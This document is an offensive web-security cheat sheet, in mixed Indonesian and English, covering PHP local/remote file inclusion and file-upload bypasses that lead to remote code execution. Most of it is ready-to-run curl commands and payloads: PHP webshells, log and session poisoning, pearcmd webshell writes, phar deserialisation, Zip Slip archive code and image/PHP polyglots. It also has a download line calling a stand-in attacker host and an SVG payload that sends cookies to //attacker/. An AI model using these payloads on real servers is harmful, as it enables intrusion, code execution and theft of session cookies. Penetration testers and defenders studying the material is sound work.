# lfi-upload — web

# LFI/RFI and File Upload → RCE

## 1. Matriks Vektor

| Vector | Prerequisites | Effect | Example Target |
|---|---|---|---|
| `php://filter` | include() sink, PHP <8 not mandatory | Read source, chain to RCE via `convert.base64-decode` | PHP 5.6–8.4 |
| `data://` | `allow_url_include=On`, PHP | Direct code exec | PHP ≤7.4 (default Off) |
| `php://input` | `allow_url_include=On` | POST body as PHP | PHP ≤7.4 |
| `expect://` | `expect` ext loaded | Shell command | rare |
| Log poisoning | LFI + writable/readable log | RCE after inserting PHP into log | Apache 2.4, nginx+php-fpm |
| `/proc/self/environ` | LFI, readable, UA injectable | RCE | Linux, kernel <5.x umumnya |
| Session file | LFI + session write primitive | RCE | PHP `session.save_path=/tmp` |
| `pearcmd.php` | LFI + PEAR installed + `register_argc_argv=On` | RCE | Debian/Ubuntu PHP default |
| `zip://` | LFI + upload zip | RCE | any |
| `phar://` | LFI + upload phar | RCE via deserialization | PHP <8.0 default; 8.0+ butuh gadget |
| Upload → RCE | file upload sink | Webshell | nginx 1.25 + php-fpm |

---

## 2. php://filter

**Send:** traversal to target file via filter wrapper.
**Appears:** base64 source (read) or decoded result as PHP (exec).
**Why it works:** wrapper enabled by default, does not require `allow_url_include`. For RCE chain, requires a *write* primitive (file upload, log, session) because `php://filter` itself is read-only unless using `convert.base64-decode` when the file contains base64.

```bash
# Read source
curl 'http://t/?f=php://filter/convert.base64-encode/resource=index.php'
curl 'http://t/?f=php://filter/convert.base64-encode/resource=/etc/passwd'

# RCE chain (file berisi base64-PHP di tempat yang bisa ditulis)
# Payload di file: PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+  (base64 dari <?php system($_GET['c']);?>)
curl 'http://t/?f=php://filter/convert.base64-decode/resource=/tmp/evil.txt&c=id'
```

Chain multi-filter (bypass prefix/suffix, PHP >=7):
```bash
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=shell.php
```

---

## 3. data:// and php://input

**Send:** payload directly in URL/body, included.
**Muncul:** eksekusi penuh.
**Why it fails:** `allow_url_include=Off` has been default since PHP 5.2; rarely On.

```bash
curl 'http://t/?f=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id'
curl -X POST 'http://t/?f=php://input' --data '<?php system("id");?>'
```

---

## 4. Log Poisoning

### 4.1 Apache access.log

**Kirim:** User-Agent berisi PHP saat request apa pun.
**Appears:** PHP executed when log is included.
**Path umum:** `/var/log/apache2/access.log`, `/var/log/httpd/access_log`, `/usr/local/apache/log/access_log`.

```bash
curl -A '<?php system($_GET["c"]);?>' 'http://t/'
curl 'http://t/?f=/var/log/apache2/access.log&c=id'
```

Bypass quote/newline in UA:
```bash
curl -A '<?=`$_GET[0]`?>' 'http://t/'
```

### 4.2 SSH auth.log

**Kirim:** username berisi PHP.
**Appears:** auth.log contains payload, included via LFI.
**Why it fails:** username is escaped/sanitized by newer sshd versions; PHP in a non-first-byte field often does not get parsed (must be at start of line).

```bash
ssh '<?php system($_GET["c"]);?>'@target
curl 'http://t/?f=/var/log/auth.log&c=id'
```

### 4.3 nginx access.log

nginx escaping format for `$http_user_agent` writes `\x22` for `"`, but `<`, `?` remain → payload `<?=` passes.
```bash
curl -A '<?=`id`?>' 'http://t/'
curl 'http://t/?f=/var/log/nginx/access.log'
```

### 4.4 php-fpm/error log — `PHP_VALUE` in .user.ini (see §9)

---

## 5. /proc/self/environ

**Send:** PHP in User-Agent (or another header that becomes env).
**Appears:** RCE if env is readable and the new log/env is not lost.
**Why it fails (common):** modern kernel ≥5.x, minimal env, containers often empty; check first:

```bash
curl 'http://t/?f=/proc/self/environ' | head -c 400
curl -A '<?php system($_GET["c"]);?>' 'http://t/?f=/proc/self/environ&c=id'
```

Related alternative: `/proc/self/fd/{0,1,2}` for Apache pipes — only reliable if log access is connected to fd.

---

## 6. Session File

**Send:** PHP in session value (`$_SESSION`).
**Appears:** RCE when the file `/tmp/sess_<id>` is included.
**Path default:** `/var/lib/php/sessions/sess_<PHPSESSID>`, `/tmp/sess_*`.
**Why it fails:** session files are often cleaned up quickly; cookie must be valid; session value is sometimes serialized.

```bash
# Primitive: endpoint yang menyimpan user input ke $_SESSION (nama, bio, csrf, locale)
curl -c cj -b cj 'http://t/login.php' -d 'user=<?php system($_GET["c"]);?>'
curl -b 'PHPSESSID=<id>' 'http://t/?f=/var/lib/php/sessions/sess_<id>&c=id'
```

Session dir listing (if LFI can `glob` via `php://filter` chain or mtime side-channel) → brute-force mtime for id.

---

## 7. pearcmd.php

**Send:** LFI to `pearcmd.php` with `+config-create` or `+download`.
**Appears:** PHP file written to disk → include.
**Prerequisites:** PHP from `php-pear` package/Debian-Ubuntu distro, `register_argc_argv=On` (default On in CLI, **Off** in php-fpm often), path `pearcmd.php` readable.

```bash
# Write webshell ke /tmp/shell.php
curl 'http://t/?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET[c])?>+/tmp/shell.php'
curl 'http://t/?f=/tmp/shell.php&c=id'

# Via download (butuh outbound)
curl 'http://t/?+download+http://attacker/shell.php+/tmp/shell.php&file=/usr/local/lib/php/pearcmd.php'
```

Lokasi `pearcmd.php`:
```
/usr/local/lib/php/pearcmd.php
/usr/share/php/pearcmd.php
/usr/share/php/PEAR/pearcmd.php
```

---

## 8. zip:// and phar://

### 8.1 zip://

**Send:** ZIP containing shell.php, uploaded, included via `zip://`.
**Muncul:** eksekusi member.
**Why it fails:** does not require zip ext enabled for `zip://` (built-in), but file must be stored at a known path.

```bash
zip shell.zip shell.php
curl -F 'file=@shell.zip' 'http://t/upload.php'
curl 'http://t/?f=zip:///var/www/upload/shell.zip%23shell.php'
# %23 = '#'
```

### 8.2 phar://

**Send:** phar file (image/manifest) with gadget object metadata → deserialization when `file_exists`/`file_get_contents` is called on `phar://` path.
**Muncul:** object injection → RCE via gadget chain (Monolog, Guzzle, Laravel, dsb).
**Why it fails:** PHP 8.0+ does not auto-deserialize metadata on ordinary file operations; requires `phar.readonly=0` when creating, and phar file must be valid (`__HALT_COMPILER()`).

```bash
# Buat phar
php -d phar.readonly=0 -r '
$p = new Phar("evil.phar");
$p->startBuffering();
$p->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
$o = new SomeGadget(...); // sesuaikan chain
$p->setMetadata($o);
$p->addFromString("x", "y");
$p->stopBuffering();
'
mv evil.phar evil.gif
curl -F 'file=@evil.gif;type=image/gif' 'http://t/upload.php'
curl 'http://t/?f=phar:///var/www/upload/evil.gif'
```

GIF stub so that magic bytes `GIF89a` are valid.

---

## 9. Upload Bypass

### 9.1 Double extension

| Server | Example name | Effect |
|---|---|---|
| Apache multi-ext | `shell.php.jpg` | `AddHandler` lama eksekusi `.php` |
| Apache + `mod_mime` | `shell.php.jpg` | Bila `.php` handler terdaftar |
| IIS 7 | `shell.asp;.jpg` | Exec `asp` |
| Nginx+php-fpm | `shell.jpg` | Fails unless `cgi.fix_pathinfo` (see 9.3) |

```bash
curl -F 'file=@shell.php;filename=shell.php.jpg;type=image/jpeg' 'http://t/upload.php'
```

### 9.2 .htaccess

**Send:** upload `.htaccess` to add handler.
**Muncul:** upload berikutnya (`shell.gif`) dieksekusi sebagai PHP.
**Prerequisites:** Apache, `AllowOverride All`, folder writable, upload does not block dotfile.

```apache
AddType application/x-httpd-php .gif
# atau
AddHandler application/x-httpd-php .gif
php_value auto_append_file /tmp/shell.php
```

```bash
curl -F 'file=@.htaccess;filename=.htaccess' 'http://t/upload.php'
curl -F 'file=@shell.gif' 'http://t/upload.php'
curl 'http://t/upload/shell.gif?c=id'
```

### 9.3 Content-Type / magic bytes / polyglot

| Control | Bypass | Notes |
|---|---|---|
| MIME type | `Content-Type: image/jpeg` in multipart | Server often only checks header |
| Magic bytes `GIF8` | prefix `GIF89a;` in shell | `GIF89a<?php system($_GET[c]);?>` |
| getimagesize() | GIF polyglot valid | Butuh minimal header GIF |
| `exif_imagetype()` | PNG header 8 bytes + PHP in tEXt | Chrome 131 irrelevant; it is the PHP server that checks |
| `finfo` | full polyglot | Difficult, often requires valid image + PHP in comment |

GIF/PHP polyglot:
```bash
printf 'GIF89a;\n<?php system($_GET["c"]);?>' > shell.gif
curl -F 'file=@shell.gif;type=image/gif' 'http://t/upload.php'
curl 'http://t/upload/shell.gif?c=id'
```

JPEG/PHP (EXIF comment):
```bash
exiftool -Comment='<?php system($_GET["c"]);?>' shell.jpg
exiftool -Comment='<?=`id`?>' shell.jpg
```

SVG XSS (if SVG is rendered directly, not executed by PHP):
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('//attacker/'+document.cookie)"/>
```
Content-Type `image/svg+xml` → Chrome 131 executes JS in upload origin if without `Content-Disposition: attachment`.

### 9.4 Zip Slip

**Send:** ZIP with entry path traversal `../../var/www/shell.php`.
**Appears:** extraction writes outside target directory → drop shell in webroot.
**Prerequisites:** server-side extraction without path normalization; Java `ZipInputStream`, Python `zipfile` <3.6.2 vulnerable; PHP `ZipArchive::extractTo` normalizes but traversal via symlink entry can work.

```python
import zipfile
z = zipfile.ZipFile("evil.zip","w")
z.writestr("../../../../var/www/html/shell.php", "<?php system($_GET['c']);?>")
z.write("safe.txt")
z.close()
```

```bash
curl -F 'file=@evil.zip' 'http://t/upload.php?extract=1'
curl 'http://t/shell.php?c=id'
```

### 9.5 nginx + php-fpm `cgi.fix_pathinfo`

**Kirim:** upload `shell.jpg` berisi PHP, akses via `/shell.jpg/x.php`.
**Appears:** php-fpm executes `shell.jpg` as script.
**Why it fails:** default `cgi.fix_pathinfo=0` in modern distros (Debian since PHP 5.3.9); nginx requires `location ~ \.php$` + try_files.

```bash
curl -F 'file=@shell.jpg;type=image/jpeg' 'http://t/upload.php'
curl 'http://t/upload/shell.jpg/x.php?c=id'
```

`/etc/nginx/sites-enabled/default` rentan:
```nginx
location ~ \.php$ {
    fastcgi_pass 127.0.0.1:9000;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
}
# fix: fastcgi_split_path_info ^(.+\.php)(/.+)$; + try_files $fastcgi_script_name =404;
```

### 9.6 PHP `user.ini`

**Send:** upload `.user.ini` in the same folder as target.
**Appears:** set `auto_prepend_file` → execution in every PHP in that folder.
**Prerequisites:** php-fpm/php-cgi with `user_ini.filename=.user.ini` (default) and `user_ini.cache_ttl` >0; requires access to a valid PHP in the folder.

```ini
auto_prepend_file=/tmp/shell.php
```

```bash
curl -F 'file=@.user.ini;filename=.user.ini' 'http://t/upload.php'
curl 'http://t/upload/index.php'   # index.php lokal memicu prepend
```

---

## 10. Diagram Keputusan

```
LFI ada?
├─ allow_url_include=On → data:// / php://input
├─ write primitive?
│  ├─ upload → zip:// | phar:// (gadget) | upload→RCE
│  ├─ log write (UA/SSH) → log poisoning
│  └─ session write → /var/lib/php/sessions/sess_*
├─ read-only saja?
│  ├─ pearcmd.php ada → +config-create
│  ├─ /proc/self/environ readable → UA poison
│  └─ tidak ada → php://filter read + credential harvest
Upload ada?
├─ Apache + .htaccess → handler override
├─ nginx+fpm cgi.fix_pathinfo=1 → shell.jpg/x.php
├─ MIME/magic cek → polyglot GIF/JPEG/SVG
├─ ZIP ekstraktor → Zip Slip
└─ phar writable → metadata deserialize
```

---

## 11. Versions / Default Behavior That Often Determines

| Product | Default | Impact |
|---|---|---|
| PHP 8.0+ | `allow_url_include=Off`, `phar.readonly=1` (dev), phar metadata does not auto-deserialize | data:// and phar gadget are more difficult |
| PHP 5.2–7.4 | `allow_url_include=Off` (5.2+) | data:// butuh enable eksplisit |
| Debian/Ubuntu `php-fpm` | `register_argc_argv=Off`, `cgi.fix_pathinfo=0` | pearcmd & fix_pathinfo fail |
| Debian/Ubuntu `php-cli` | `register_argc_argv=On` | pearcmd works only if reachable via include |
| Apache httpd 2.4 | `.htaccess` requires `AllowOverride All`; multi-ext `.php.jpg` does not execute by default | upload bypass requires AddHandler |
| nginx 1.25 | does not parse `.htaccess`; `location ~ \.php$` + try_files | fix_pathinfo requires misconfig |
| php-fpm 8.3 | `user_ini.filename=.user.ini` | `.user.ini` prepend works |
| Linux kernel 5.x/6.x | `/proc/self/environ` minimal in service manager | UA poison environ often empty |
| Chrome 131 | SVG `image/svg+xml` inline JS jalan; `Content-Disposition: attachment` blokir | SVG XSS butuh header salah |
| Windows IIS 10 (Win11 24H2) | double-ext `asp;.jpg` no longer executed by default | requires `.config` override |

---

## 12. Operational Pitfalls

1. **`allow_url_include` has been Off since PHP 5.2** — don't design a chain on data:///php://input without verifying `phpinfo` or `ini_get`. On modern PHP 8.x it's practically dead.
2. **`register_argc_argv=Off` on Debian php-fpm** — pearcmd fails silently; `$_SERVER['argv']` is empty so `+config-create+` in the URL argument isn't parsed. Check mode: CLI vs FPM.
3. **php-fpm `cgi.fix_pathinfo=0` default** — the `shell.jpg/x.php` technique is dead on modern distros. Requires a misconfigured nginx + flag On.
4. **`/proc/self/environ` is empty** in modern service managers (systemd strips env). UA poisoning environ is only historical (kernel <4.x / php-fpm without clean env).
5. **Session directory differs** — `/var/lib/php/sessions` vs `/tmp` vs `[session.save_path]`. The web UID may not be able to read it. Check `phpinfo` or `included_files`.
6. **Session cleanup** — `session.gc_maxlifetime=1440` (24 minutes) default; a shell in a session may disappear before being included.
7. **Log rotation** — access.log is rotated; payload is in the old file or new rotation. Including the oldest log file is often zero.
8. **Apache log escaping** — `CustomLog` without escaping quotes; `%{User-Agent}i` containing newline breaks the log and can corrupt the payload. nginx escapes `\x22` for `"` — use `<?=` without quotes.
9. **`phar.readonly=1`** — can't create a phar on the target server; must create locally with `-d phar.readonly=0`, send as a regular file. PHP 8.0+ requires the first file operation on `phar://` to be truly valid + needs an autoload gadget.
10. **`zip://` requires an absolute path** and `#` URL-encoded as `%23`. Many LFI filters block `zip://` in the prefix — use a filter chain or `php://filter/...resource=zip://...`.
11. **Magic bytes vs `getimagesize` vs `finfo`** — three different checks. Does `GIF89a;` pass `finfo`? No. Requires a valid polyglot + PHP in an area that doesn't break the structure (comment/tEXt).
12. **`exif_imagetype` strict** — only checks the first 8 bytes; `GIF89a<?php ...` passes `exif` but fails if the app renders via GD (`imagecreatefromgif` will error). The shell still runs if accessed directly.
13. **Upload MIME via `Content-Type`** — only useful if the server reads the header, not `finfo_file`. Chrome 131 sets MIME from the extension, so the browser can force `image/gif` even with the name `shell.php` (but the server often overrides from the filename).
14. **`.htaccess` doesn't apply on nginx** — don't send `.htaccess` to an nginx target; use `.user.ini` or fix_pathinfo.
15. **`user_ini.cache_ttl`** default 300 seconds — `.user.ini` changes only take effect after the TTL; racing with cleanup.
16. **`.user.ini` in the web root** may already exist and refuse, or `open_basedir` blocks the prepend path.
17. **Zip Slip in PHP ZipArchive** — `extractTo` **normalizes** `../` since PHP 5.2.7; Zip Slip via PHP is rare; targets are Java `java.util.zip.ZipInputStream`, Python `zipfile` <3.6.2, old Node `unzipper`, Go `archive/zip` without sanitization.
18. **Symlink entry in zip** — `ZipArchive::extractTo` creates a symlink (if the symlink ext is enabled); a symlink chain to the webroot can be effective even if `../` is blocked.
19. **Image extension rewritten** — the upload server renames `shell.gif` → `shell_12345.gif`; the path must be enumerated (mtime, sequential ID, response Location).
20. **Difference between `include` vs `require` vs `require_once`** — `require_once` on the same path caches; a second shell needs a unique path (`?a`, symlink, hardlink).
21. **`open_basedir`** blocks `/etc/passwd`, `/proc/self/environ`, logs — all LFI chains are dead; check `phpinfo`/error. Bypass needs another bug (glob://, syscalls).
22. **`disable_functions`** (common on shared hosting: `system,exec,shell_exec,passthru,popen,proc_open`) — the shell still includes but execution is dead; use `pcntl_exec`, FFI, `LD_PRELOAD` via `mail()`/`putenv` (requires `sendmail_path` writable).
23. **php-fpm `security.limit_extensions`** default `.php` — SCRIPT_FILENAME to `.jpg` is refused even with `fix_pathinfo` On. Bypass isn't via fix_pathinfo.
24. **php-fpm chroot / `chdir`** — absolute paths in `phar://` and `zip://` may not resolve just like in regular PHP include.
25. **Log poison + CRLF** — many WAFs block newline in UA; use a single-line `<?=` without `?>` to avoid needing a newline.
26. **ModSecurity CRS** — rule 932xxx blocks `php://`, `data://`, `phar://`, `zip://` in parameters; double encoding `%25%70%68%70` or case `PHP://` sometimes passes (not a guarantee).
27. **Container/devcontainer** — `/var/log/*` often goes to stdout (docker json-file), log files don't exist. php-fpm in a container without a log file → log poisoning dead.
28. **SELinux/AppArmor** — `httpd_t` can't read `/var/log/auth.log`, `/proc/self/environ` on some distros (Fedora 40, Ubuntu 24.04 default enforce).
29. **Windows path** — LFI on Windows: `C:\Windows\win.ini`, `C:\inetpub\logs\LogFiles\W3SVC1\`, `\\?\` prefix; double-extension `asp;.jpg` no longer execs on IIS 10 default.
30. **`session.upload_progress`** — can be a session write primitive without an app endpoint (`PHP_SESSION_UPLOAD_PROGRESS` in multipart); still needs LFI + a session id that can be guessed/set.
31. The `phar` stub must be `__HALT_COMPILER(); ?>` as a literal token — incorrect format → file is not phar; error `phar error: invalid url or non-existent`.
32. A valid polyglot GIF must have a trailer `;` — `GIF89a;` is the minimal header; GD `imagecreatefromgif` can reject it if without an image descriptor; use a valid 1x1 GIF + PHP in the comment extension.
33. Upload name normalization — `shell.php.jpg` → `shell.jpg` (some frameworks); `.htaccess` → `.htaccess.txt` (anti-dotfile frameworks). Check storage conventions first.
34. Race upload→include — file is deleted after processing (thumbnailing queue), the shell must be accessible for a short window; use an executing render/convert endpoint, or upload to a permanent public path.
35. Long `php://filter` chain — PHP has a wrapper length limit (~4096) and `iconv` can fail in certain locales; test on the target PHP version, do not assume 8.3 = 7.4.

---

## [reasoning trace]


